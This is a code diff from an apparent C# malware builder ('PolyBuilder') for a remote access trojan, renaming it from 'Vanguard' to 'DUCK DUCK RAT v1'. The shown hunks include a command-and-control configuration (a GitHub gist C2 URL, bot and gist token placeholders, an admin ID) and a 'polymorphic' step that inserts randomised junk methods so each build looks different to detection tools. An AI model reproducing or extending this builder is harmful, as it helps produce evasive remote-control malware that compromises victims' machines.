@@ -16,7 +16,7 @@ namespace PolyBuilder
 
         static void Main(string[] args)
         {
-            Console.WriteLine("[*] Vanguard C# Polymorphic Engine Starting...");
+            Console.WriteLine("[*] DUCK DUCK RAT v1 C# Polymorphic Engine Starting...");
 
             // Logic to find the root directory (where the 'defense' folder exists)
             string currentDir = Directory.GetCurrentDirectory();
@@ -75,7 +75,7 @@ namespace PolyBuilder
 
                 var targets = new Dictionary<string, string>
                 {
-                    { "C2_URL", "https://gist.githubusercontent.com/ptrkxlord/vanguard_c2" },
+                    { "C2_URL", "https://gist.githubusercontent.com/ptrkxlord/DUCK DUCK RAT v1_c2" },
                     { "BOT_TOKEN", "7265936412:AAH-YOUR-REAL-TOKEN-HERE" },
                     { "GIST_TOKEN", "ghp_YOUR_REAL_GITHUB_TOKEN_HERE" },
                     { "ADMIN_ID", "123456789" },
@@ -148,7 +148,7 @@ namespace PolyBuilder
 
                     string guid8 = Guid.NewGuid().ToString("N").Substring(0, 8);
                     long val = rng.Next(10000, 99999);
-                    string junk = "\n        // [POLY_JUNK]\n        private static void _vanguard_" + guid8 + "() {\n" +
+                    string junk = "\n        // [POLY_JUNK]\n        private static void _DuckDuckRat_" + guid8 + "() {\n" +
                                   "            int val = " + val + ";\n" +
                                   "            if (val > 50000) Console.WriteLine(\"Hash:\" + " + val + ");\n" +
                                   "        }\n";
@@ -165,3 +165,5 @@ namespace PolyBuilder
         }
     }
 }
+
+
